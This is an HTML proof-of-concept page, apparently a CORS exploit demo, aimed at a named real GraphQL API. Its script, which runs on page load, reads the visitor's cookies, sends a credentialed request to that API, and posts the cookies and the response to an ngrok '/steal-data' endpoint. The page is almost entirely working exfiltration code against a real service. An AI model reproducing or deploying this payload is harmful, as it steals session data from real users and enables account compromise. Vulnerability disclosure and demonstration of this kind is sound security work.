<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>CORS Exploit Demo</title>
</head>
<body>
    <h1><u>Demonstration of CORS Exploit</u></h1>
<script>
    // Capture the user's cookies
    const userCookies = document.cookie;

    // Make a request to the vulnerable API
    fetch('https://api.consumer.worldcoin.org/v1/graphql', {
        method: 'POST',
        credentials: 'include',
        headers: {
            'Content-Type': 'application/json',
            'Origin': 'https://kripto-geek.github.io/cors-exploit-demo/' 
        },
        body: JSON.stringify({ query: `{ publicData { id name } }` })
    })
    .then(response => response.text())
    .then(data => {
        // Send the cookies and response data to your server
        fetch('https://827b-2401-4900-1c82-da4e-3a56-a4c3-7e9-3a2d.ngrok-free.app/steal-data', {
            method: 'POST',
            body: JSON.stringify({ cookies: userCookies, response: data }),
            headers: {
                'Content-Type': 'application/json'
            }
        })
        .then(res => res.text())
        .then(serverResponse => console.log('Server received:', serverResponse))
        .catch(error => console.error('Error sending data to server:', error));
    })
    .catch(error => console.error('Error fetching API:', error));
</script>
</body>
</html>
